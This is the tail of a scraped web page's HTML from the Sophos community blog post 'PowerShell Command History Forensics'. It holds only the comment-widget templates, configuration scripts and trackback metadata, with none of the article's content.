<script>jQuery.telligent.evolution.template.register('fragment-3081_newRepliesTemplate',function(h,d){var s=[];with(d){with(h){s.push('	<div class=\"threaded new-replies '); if(offscreen) { s.push(' offscreen '); } s.push('\" '); if(offscreen) { s.push(' style=\"width: ');s.push(String( width ));s.push('px\" '); } s.push('>\r\n	<a href=\"#\" data-messagename=\"ui.replies.new\" data-replyid=\"');s.push(String( replyId ));s.push('\">\r\n		'); if(newReplies == 1) { s.push('\r\n			');s.push(String( newReplies ));s.push(' new reply\r\n		'); } else { s.push('\r\n			');s.push(String( newReplies ));s.push(' new replies\r\n		'); } s.push('\r\n	<\/a>\r\n<\/div>\r\n\r\n');}}return s.join('');});</script>
<script>jQuery.telligent.evolution.template.register('fragment-3081_replyTemplate',function(h,d){var s=[];with(d){with(h){s.push('	<li class=\"threaded content-item '); if(isDeleted) { s.push(' deleted '); } s.push('\"\r\n	data-id=\"');s.push(escape(String( id )));s.push('\"\r\n	data-parentid=\"');s.push(escape(String( parentId )));s.push('\"\r\n	data-createddate=\"');s.push(escape(String( createdDate )));s.push('\"\r\n	data-yesvotes=\"');s.push(escape(String( yesVotes )));s.push('\"\r\n	data-novotes=\"');s.push(escape(String( noVotes )));s.push('\">\r\n\r\n	<div class=\"rendered-content\">\r\n		');s.push(String( body ));s.push('\r\n		<div class=\"typing-status-wrapper\"><\/div>\r\n		<div class=\"new-replies-wrapper\"><\/div>\r\n	<\/div>\r\n\r\n	<div class=\"newreply\"><\/div>\r\n\r\n	<ul class=\"content-list threaded\"\r\n	data-sortby=\"');s.push(escape(String( sortBy )));s.push('\"\r\n	data-sortorder=\"');s.push(escape(String( sortOrder )));s.push('\"><\/ul>\r\n\r\n<\/li>\r\n\r\n');}}return s.join('');});</script>
<script>jQuery.telligent.evolution.template.register('fragment-3081_replyFormTemplate',function(h,d){var s=[];with(d){with(h){s.push('	<div class=\"reply-form '); if (editingReplyId) { s.push(' edit '); } else { s.push(' create '); } s.push('\" '); if (editingReplyId) { s.push(' data-editing=\"');s.push(String( editingReplyId ));s.push('\" '); } s.push('>\r\n	'); if(!editingReplyId) { s.push('\r\n		\r\n		<div class=\"author\"  data-authorprofileurl=\"\" >\r\n			<div class=\"avatar\">\r\n									<img src=\"https:\/\/community.sophos.com\/cfs-filesystemfile\/__key\/communityserver-components-imagefileviewer\/system-images\/anonymous.gif_2D00_44x44x2.png?_=637355154669703822\" border=\"0px\" alt=\"Anonymous\" \/>\r\n							<\/div>\r\n			<div class=\"meta\">\r\n				<span class=\"user-name\">\r\n					<span class=\"ui-userpresence ui-tip \" style=\"display: none;\"\r\ndata-userid=\"2101\" \r\ndata-contentid=\"478b14f0-fa17-476e-9e46-64d5cad096cd\" \r\ndata-contenttypeid=\"e9ed4118-60ed-4f2b-a026-5705b8793d05\" \r\ndata-present=\"\" \r\ndata-presentlabel=\"Online\" \r\ndata-notpresentlabel=\"Offline\" \r\ndata-tip=\"\"><\/span>\r\n											Anonymous\r\n									<\/span>\r\n			<\/div>\r\n		<\/div>\r\n	'); } s.push('\r\n\r\n	<div class=\"editor\"><\/div>\r\n\r\n<\/div>\r\n\r\n');}}return s.join('');});</script>
<script>jQuery.telligent.evolution.template.register('fragment-3081_typingIndicatorTemplate',function(h,d){var s=[];with(d){with(h){s.push('	<div class=\"threaded typing-status\">');s.push(String( displayName ));s.push(' is typing a reply...<\/div>\r\n\r\n');}}return s.join('');});</script>
<script>jQuery.telligent.evolution.template.register('fragment-3081_replyListTemplate',function(h,d){var s=[];with(d){with(h){s.push('	<ul class=\"content-list threaded\"\r\n	data-sortby=\"');s.push(escape(String( sortBy )));s.push('\"\r\n	data-sortorder=\"');s.push(escape(String( sortOrder )));s.push('\"><\/ul>\r\n\r\n');}}return s.join('');});</script>
<script>jQuery.telligent.evolution.template.register('fragment-3081_headerTemplate',function(h,d){var s=[];with(d){with(h){s.push('	<div class=\"threaded-filter\" id=\"fragment-3081_filter\">\r\n	<ul class=\"filter order margin-bottom margin-top\">\r\n		<li class=\"filter-option\" data-sortby=\"CreatedDate\" data-sortorder=\"Ascending\">\r\n			<a class=\"navigable\" href=\"?CommentSortBy=CreatedDate&amp;CommentSortOrder=Ascending\">Oldest<\/a>\r\n		<\/li>\r\n					<li class=\"filter-option\" data-sortby=\"Votes\" data-sortorder=\"Descending\">\r\n				<a class=\"navigable\" href=\"?CommentSortBy=Votes&amp;CommentSortOrder=Descending\">Best<\/a>\r\n			<\/li>\r\n				<li class=\"filter-option\" data-sortby=\"CreatedDate\" data-sortorder=\"Descending\">\r\n			<a class=\"navigable\" href=\"?CommentSortBy=CreatedDate&amp;CommentSortOrder=Descending\">Newest<\/a>\r\n		<\/li>\r\n	<\/ul>\r\n<\/div>\r\n\r\n');}}return s.join('');});</script>
<script>jQuery.telligent.evolution.template.register('fragment-3081_statisticsTemplate',function(h,d){var s=[];with(d){with(h){s.push('	<ul class=\"attribute-list\">\r\n'); if (typeof commentCount !== 'undefined')	{ s.push('\r\n	<li class=\"attribute-item count\">\r\n		<span class=\"value prepend-icon comment\">\r\n			'); if(commentCount == 1) { s.push('\r\n				');s.push(String( commentCount ));s.push(' comment\r\n			'); } else { s.push('\r\n				');s.push(String( commentCount ));s.push(' comments\r\n			'); } s.push('\r\n		<\/span>\r\n	<\/li>\r\n'); } s.push('\r\n'); if (typeof userCount !== 'undefined') { s.push('\r\n	<li class=\"attribute-item users\">\r\n		<span class=\"value prepend-icon user\">\r\n			'); if(userCount == 1) { s.push('\r\n				');s.push(String( userCount ));s.push(' member is here\r\n			'); } else { s.push('\r\n				');s.push(String( userCount ));s.push(' members are here\r\n			'); } s.push('\r\n		<\/span>\r\n	<\/li>\r\n'); } s.push('\r\n<\/ul>\r\n');}}return s.join('');});</script>
	<script type="text/javascript" src="https://community.sophos.com/cfs-filesystemfile/__key/defaultwidgets/7bb87a0cc5864a9392ae5b9e5f9747b7-e4e96f3241434dc7bc4a04d39c30192f/ui.js?_=637355151232571632"></script>

	<script type="text/javascript">
	jQuery(function() {
		jQuery.telligent.evolution.widgets.comments.register({
			commentId:  null ,
			preFocus:  false ,
			wrapperId: 'fragment-3081',
			wrapper: '#fragment-3081',
			container: '#fragment-3081_preRenderedWrapperId',
			bestRepliesWrapperId: '$core_v2_encoding.JavascriptEncode($bestRepliesWrapperId)',
			contentId: 'c7d1bb2e-7a5c-48e6-99db-6d6d55e160fe',
			contentTypeId: 'f7d226ab-d59f-475c-9d22-4a79e3f0ec07',
			commentTypeId:  '' ,
			sortOrder: 'Descending',
			sortBy: 'Votes',
			flattenedSortBy: 'CreatedDate',
			flattenedSortOrder: 'Ascending',
			flattenedDepth: 2,
			pageSize: 5,
			contentUrl: 'https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics',
									highlightNewSeconds: 4,
			endlessScroll:  true ,
			listRepliesUrl: '/utility/scripted-file.ashx?_cf=callback-model-list-replies.vm\u0026_fid=3081\u0026_wid=fragment-3081\u0026_ct=page\u0026_cp=post\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			addReplyUrl: '/utility/scripted-file.ashx?_cf=callback-model-add-reply.vm\u0026_fid=3081\u0026_wid=fragment-3081\u0026_ct=page\u0026_cp=post\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			editReplyUrl: '/utility/scripted-file.ashx?_cf=callback-model-edit-reply.vm\u0026_fid=3081\u0026_wid=fragment-3081\u0026_ct=page\u0026_cp=post\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			getReplyUrl: '/utility/scripted-file.ashx?_cf=callback-model-get-reply.vm\u0026_fid=3081\u0026_wid=fragment-3081\u0026_ct=page\u0026_cp=post\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			listBestUrl: '/utility/scripted-file.ashx?_cf=callback-model-list-best.vm\u0026_fid=3081\u0026_wid=fragment-3081\u0026_ct=page\u0026_cp=post\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			loadMoreTemplate: 'fragment-3081_loadMoreTemplate',
			newRepliesTemplate: 'fragment-3081_newRepliesTemplate',
			replyTemplate: 'fragment-3081_replyTemplate',
			typingIndicatorTemplate: 'fragment-3081_typingIndicatorTemplate',
			replyListTemplate: 'fragment-3081_replyListTemplate',
			replyFormTemplate: 'fragment-3081_replyFormTemplate',
			emptyGuid: '00000000-0000-0000-0000-000000000000',
			deleteCommentPanelUrl: '#_cptype=panel\u0026_cpcontexttype=Explicit\u0026_cppanelid=5aabcf9a-e27b-49e7-93cf-060498d68763\u0026commentid=00000000-0000-0000-0000-000000000000',
			loginUrl: '/login?ReturnUrl=%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			headerTemplate: 'fragment-3081_headerTemplate',
			filterWrapper: '#fragment-3081_filter',
			noRepliesMessage: 'There are no remaining comments.',
			replyEditor: {
				appendTo: function(container) {
					jQuery('#fragment-3081_fragment-3081_replyEditor').evolutionHtmlEditor('moveTo',container);;
					var contextId = 'comment-' + (container.closest('.content-item').data('id') || '');
                    jQuery('#fragment-3081_fragment-3081_replyEditor').evolutionHtmlEditor('context',contextId);;
					jQuery('#fragment-3081_fragment-3081_replyEditor').on('keydown', function(e) { jQuery.telligent.evolution.messaging.publish('widgets.threadedComments.typing', { container: container }) });;
				},
				remove: function() {
					// removing the editor technically just moves it back to a hidden location
					var wrapper = '#fragment-3081_editorWrapperWrapper';
					jQuery('#fragment-3081_fragment-3081_replyEditor').evolutionHtmlEditor('moveTo',wrapper);;
				},
				val: function(val) {
					if (typeof(val) !== 'undefined') {
						jQuery('#fragment-3081_fragment-3081_replyEditor').evolutionHtmlEditor('val', val);
						return val;
					}
					return jQuery('#fragment-3081_fragment-3081_replyEditor').evolutionHtmlEditor('val');
				},
				focus: function() {
					jQuery('#fragment-3081_fragment-3081_replyEditor').evolutionHtmlEditor('focus');
				}
			},
			text: {
				more: 'More',
				peopleWhoVoted: 'People who voted on this reply',
				noVotes: 'No Votes',
				successMessage: 'Your comment has been posted.',
				moderateMessage: 'Thank you, your comment requires moderation so it may take a while to appear.'
			},
			statisticsWrapper: '#fragment-3081_statisticsWrapper',
			statisticsTemplate: 'fragment-3081_statisticsTemplate',
			totalComments: 0,
			presentUsers: 0,
			storeTempDataCallbackUrl: '/utility/scripted-file.ashx?_cf=callback-model-store-temp.vm\u0026_fid=3081\u0026_wid=fragment-3081\u0026_ct=page\u0026_cp=post\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			loginUrl: '/login?ReturnUrl=%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			tempBody: '',
			createEditor: {
				attachOnChange: function() {
					jQuery('#fragment-3081_fragment-3081_createEditor').on('keydown', function(e) { jQuery.telligent.evolution.messaging.publish('widgets.comments.typing', { from: 'fragment-3081' }) });;
				},
				val: function(val) {
					if (typeof(val) !== 'undefined') {
						jQuery('#fragment-3081_fragment-3081_createEditor').evolutionHtmlEditor('val', val);
					}
					return jQuery('#fragment-3081_fragment-3081_createEditor').evolutionHtmlEditor('val');
				},
				focus: function() {
					jQuery('#fragment-3081_fragment-3081_createEditor').evolutionHtmlEditor('focus');
				}
			}
		});
	});
	</script>

	<script type="text/javascript" src="https://community.sophos.com/cfs-filesystemfile/__key/defaultwidgets/7bb87a0cc5864a9392ae5b9e5f9747b7-212f71d69e37457887f33f32918f6ae2/ui.js?_=637355151209846942"></script>

	<script type="text/javascript">
		jQuery(function(){
			jQuery.telligent.evolution.widgets.userHover.register({
				getUserInformationUrl: '/utility/scripted-file.ashx?_cf=get-user-information.vm\u0026_fid=1507\u0026_wid=footer-1507\u0026_ct=footer\u0026_cp=\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=10\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
				getRecentActivityUrl: '/utility/scripted-file.ashx?_cf=get-recent-activity.vm\u0026_fid=1507\u0026_wid=footer-1507\u0026_ct=footer\u0026_cp=\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=10\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics'
			});
		});
	</script>

<script type="text/javascript">
// <![CDATA[
window.ctl05_ctl00 = new Telligent_CallbackManager('ctl05_ctl00','ctl05$ctl00','ctl04');
// ]]>
</script><script type="text/javascript">
// <![CDATA[
window.ctl06_ctl00 = new Telligent_CallbackManager('ctl06_ctl00','ctl06$ctl00','ctl04');
// ]]>
</script><script type="text/javascript">
// <![CDATA[
window.ctl07_ctl00 = new Telligent_CallbackManager('ctl07_ctl00','ctl07$ctl00','ctl04');
// ]]>
</script></form>
<!--
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
xmlns:dc="http://purl.org/dc/elements/1.1/"
xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
<rdf:Description
rdf:about="https://community.sophos.com//sophos-labs/b/blog/posts/powershell-command-history-forensics"
dc:identifier="https://community.sophos.com//sophos-labs/b/blog/posts/powershell-command-history-forensics"
dc:title="PowerShell Command History Forensics"
trackback:ping="https://community.sophos.com//sophos-labs/b/blog/trackback?WeblogPostId=707" />
</rdf:RDF>
-->
</body>
</html>